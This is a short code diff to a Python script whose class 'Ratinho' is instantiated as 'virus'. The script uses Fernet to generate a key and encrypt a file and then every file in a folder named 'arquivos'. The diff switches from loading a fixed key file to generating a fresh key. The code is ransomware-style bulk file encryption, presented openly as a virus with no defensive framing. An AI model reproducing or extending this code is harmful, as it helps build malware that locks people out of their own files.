@@ -15,7 +15,7 @@ class Ratinho:
 
     
     def set_key_file(self, file_name):
-        with open('filekey.key', 'rb') as f:
+        with open(file_name, 'rb') as f:
             self.key = f.read()
             self.fernet = Fernet(self.key)
 
@@ -41,7 +41,7 @@ class Ratinho:
 
 
 virus = Ratinho()
-virus.set_key_file('filekey.key')
+virus.generate_key_file()
 virus.encrypt('arquivo.txt')
 virus.decrypt('arquivo.txt')
 
@@ -49,3 +49,4 @@ folder_path = 'arquivos'
 for file_name in glob.glob(os.path.join(folder_path, '*.*')):
     with open(file_name, 'r') as f:
         virus.encrypt(file_name)
+
